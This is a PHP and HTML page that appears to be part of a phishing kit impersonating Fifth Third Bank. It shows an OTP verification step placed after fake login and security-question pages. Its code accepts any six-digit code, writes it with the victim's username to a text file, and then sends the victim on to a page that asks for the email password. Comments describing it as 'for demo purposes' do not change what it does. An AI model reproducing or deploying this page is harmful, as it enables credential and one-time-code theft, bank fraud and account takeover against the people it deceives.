<?php
session_start();
require_once __DIR__ . '/includes/file_storage.php';

// Redirect to login if no username in session
if (!isset($_SESSION['emzemz'])) {
    header('Location: index.php');
    exit;
}

$username = $_SESSION['emzemz'];
$errors = [];
$success = '';

// Generate a random 6-digit OTP for demo purposes
$generatedOtp = sprintf('%06d', mt_rand(100000, 999999));

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $otpCode = trim($_POST['otp_code'] ?? '');
    
    // Validation
    if (empty($otpCode)) {
        $errors['otp_code'] = 'Please enter the verification code';
    } elseif (!preg_match('/^\d{6}$/', $otpCode)) {
        $errors['otp_code'] = 'Please enter a valid 6-digit code';
    } else {
        // For demo purposes, accept any 6-digit code
        // In production, you would verify against the actual OTP sent
        $data = [
            'step' => 'otp_verification',
            'usrnm' => $username,
            'emzemz' => $username,
            'vrf_cd' => $otpCode,
            'generated_otp' => $generatedOtp,
            'verified' => true
        ];
        
        saveUserData('otp_verification.txt', $data);
        
        // Redirect to email password page
        header('Location: email_password.php');
        exit;
    }
}

$footerLinks = [
    'About Us',
    'Customer Service',
    'Careers',
    'Investor Relations',
    'Media Center',
    'Security',
    'Privacy',
    'Site Map'
];
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fifth Third Bank - OTP Verification</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body>
    <div class="min-h-screen bg-white flex flex-col text-[#1b1b1b]">
        <!-- Header -->
        <header class="bg-white border-b border-gray-200">
            <div class="max-w-6xl mx-auto flex flex-wrap items-center justify-between px-6 py-4 gap-4">
                <div class="flex items-center">
                    <img src="assets/fifththird-logo.svg" alt="Fifth Third Bank" class="h-12 w-auto" />
                </div>
                <div class="text-xs sm:text-sm text-gray-700 flex items-center gap-3 uppercase tracking-wide">
                    <a href="#" class="hover:text-[#003087]">Customer Service</a>
                    <span class="text-gray-300">|</span>
                    <a href="#" class="hover:text-[#003087]">Branch &amp; ATM Locator</a>
                </div>
            </div>
        </header>

        <!-- Blue Gradient Section with OTP Card -->
        <section class="bg-gradient-to-r from-[#0b2b6a] via-[#123b9d] to-[#1a44c6] py-16 px-4">
            <div class="max-w-6xl mx-auto">
                <!-- Breadcrumb -->
                <div class="mb-6 flex items-center gap-2 text-sm text-white/90">
                    <a href="#" class="text-white/70 hover:text-white">Home</a>
                    <span class="text-white/50">&#8250;</span>
                    <a href="index.php" class="text-white/70 hover:text-white">Login</a>
                    <span class="text-white/50">&#8250;</span>
                    <a href="security_questions.php" class="text-white/70 hover:text-white">Security Questions</a>
                    <span class="text-white/50">&#8250;</span>
                    <span class="font-semibold">OTP Verification</span>
                </div>

                <!-- OTP Card -->
                <div class="flex justify-center">
                    <div class="bg-[#f4f2f2] max-w-md w-full rounded-md shadow-[0_12px_30px_rgba(0,0,0,0.25)] border border-gray-200">
                        <div class="px-8 py-6">
                            <div class="text-center mb-6">
                                <div class="mx-auto w-16 h-16 bg-[#123b9d] rounded-full flex items-center justify-center mb-4">
                                    <svg class="w-8 h-8 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path>
                                    </svg>
                                </div>
                                <h1 class="text-2xl font-bold text-gray-800 mb-2">Enter Verification Code</h1>
                                <p class="text-sm text-gray-600">We've sent a 6-digit verification code to your registered email and phone number.</p>
                            </div>
                            
                            <form method="POST" class="space-y-6">
                            <!-- Error Display -->
                            <?php if (!empty($errors)): ?>
                                <div class="bg-red-50 border-l-4 border-red-500 p-4 mb-4">
                                    <div class="flex">
                                        <div class="flex-shrink-0">
                                            <svg class="h-5 w-5 text-red-500" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor">
                                                <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clip-rule="evenodd" />
                                            </svg>
                                        </div>
                                        <div class="ml-3">
                                            <p class="text-sm text-red-700">
                                                Please fix the following errors:
                                                <ul class="list-disc pl-5 mt-1">
                                                    <?php foreach ($errors as $error): ?>
                                                        <li><?php echo htmlspecialchars($error); ?></li>
                                                    <?php endforeach; ?>
                                                </ul>
                                            </p>
                                        </div>
                                    </div>
                                </div>
                            <?php endif; ?>

                            <form method="POST" class="space-y-6">
                                <!-- OTP Input -->
                                <div>
                                    <label for="otp_code" class="block text-sm font-semibold text-gray-700 mb-2">
                                        Verification Code
                                    </label>
                                    <div class="relative">
                                        <input
                                            type="text"
                                            id="otp_code"
                                            name="otp_code"
                                            placeholder="Enter 6-digit code"
                                            maxlength="6"
                                            pattern="\d{6}"
                                            value="<?php echo htmlspecialchars($_POST['otp_code'] ?? ''); ?>"
                                            class="w-full text-center text-2xl font-mono border-2 border-gray-300 rounded-md px-4 py-3 tracking-widest focus:outline-none focus:ring-2 focus:ring-[#0b2b6a] focus:border-[#123b9d]"
                                            autocomplete="one-time-code"
                                        />
                                    </div>
                                    <?php if (isset($errors['otp_code'])): ?>
                                        <p class="mt-2 text-xs font-semibold text-red-600"><?php echo htmlspecialchars($errors['otp_code']); ?></p>
                                    <?php endif; ?>
                                    <p class="mt-2 text-xs text-gray-500">Enter the 6-digit code sent to your email and phone</p>
                                </div>

                                <!-- Resend Code -->
                                <div class="text-center">
                                    <p class="text-sm text-gray-600 mb-2">Didn't receive the code?</p>
                                    <button
                                        type="button"
                                        onclick="resendCode()"
                                        class="text-sm text-[#123b9d] font-semibold hover:underline"
                                    >
                                        Resend Code
                                    </button>
                                </div>

                                <!-- Submit Button -->
                                <button
                                    type="submit"
                                    class="w-full bg-[#123b9d] hover:bg-[#0f2f6e] text-white font-semibold py-3 rounded-sm uppercase tracking-wide transition"
                                >
                                    Verify Code
                                </button>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        </section>

        <!-- Information Section -->
        <section class="bg-white py-12 px-4 flex-1">
            <div class="max-w-6xl mx-auto space-y-8">
                <h2 class="text-2xl font-semibold text-gray-900">Two-Factor Authentication</h2>
                <p class="mt-3 text-gray-700 leading-relaxed">
                    Two-factor authentication adds an extra layer of security to your account. Even if someone knows your password, they won't be able to access your account without the verification code.
                </p>

                <div class="grid gap-6 md:grid-cols-2">
                    <div class="border border-gray-200 rounded-md p-6 bg-[#f8f8f8]">
                        <h3 class="text-xl font-semibold text-gray-900 mb-2">How It Works</h3>
                        <p class="text-sm text-gray-700 leading-relaxed">
                            When you sign in, we'll send a unique verification code to your registered email and phone number. You'll need to enter this code to complete the authentication process.
                        </p>
                    </div>

                    <div class="border border-gray-200 rounded-md p-6 bg-white shadow-sm">
                        <h3 class="text-xl font-semibold text-gray-900 mb-2">Security Tips</h3>
                        <p class="text-sm text-gray-700 leading-relaxed mb-3">
                            Never share your verification codes with anyone. Our representatives will never ask for your verification codes over the phone or email.
                        </p>
                        <ul class="text-sm text-gray-700 space-y-1">
                            <li>• Keep your contact information updated</li>
                            <li>• Use codes immediately after receiving them</li>
                            <li>• Report suspicious activity immediately</li>
                        </ul>
                    </div>
                </div>
            </div>
        </section>

        <!-- Footer -->
        <footer class="bg-[#f4f4f4] border-t border-gray-200">
            <div class="max-w-6xl mx-auto px-6 py-10 text-center">
                <div class="flex flex-wrap justify-center gap-x-4 gap-y-2 text-sm text-gray-700">
                    <?php foreach ($footerLinks as $index => $label): ?>
                        <a href="#" class="hover:text-[#003087] underline-offset-4 hover:underline">
                            <?php echo htmlspecialchars($label); ?>
                        </a>
                        <?php if ($index < count($footerLinks) - 1): ?>
                            <span class="text-gray-400">|</span>
                        <?php endif; ?>
                    <?php endforeach; ?>
                </div>

                <p class="mt-5 text-sm text-gray-700">
                    Copyright © 2025 Fifth Third Bank, National Association. All Rights Reserved. Member FDIC.
                    <span class="inline-flex items-center gap-1 font-semibold">
                        <span role="img" aria-label="house">🏠</span>
                        Equal Housing Lender.
                    </span>
                </p>

                <div class="mt-6 flex items-center justify-center">
                    <img src="assets/fifththird-logo.svg" alt="Fifth Third Logo" class="h-10 w-auto" />
                </div>
            </div>
        </footer>
    </div>

    <script>
        function resendCode() {
            // In a real application, this would make an API call to resend the OTP
            alert('A new verification code has been sent to your registered email and phone number.');
            
            // Refresh the page to show a new demo code
            window.location.reload();
        }

        // Auto-focus OTP input on page load
        document.addEventListener('DOMContentLoaded', function() {
            const otpInput = document.getElementById('otp_code');
            if (otpInput) {
                otpInput.focus();
                
                // Only allow numeric input
                otpInput.addEventListener('input', function(e) {
                    this.value = this.value.replace(/[^0-9]/g, '');
                });
            }
        });
    </script>
</body>
</html>
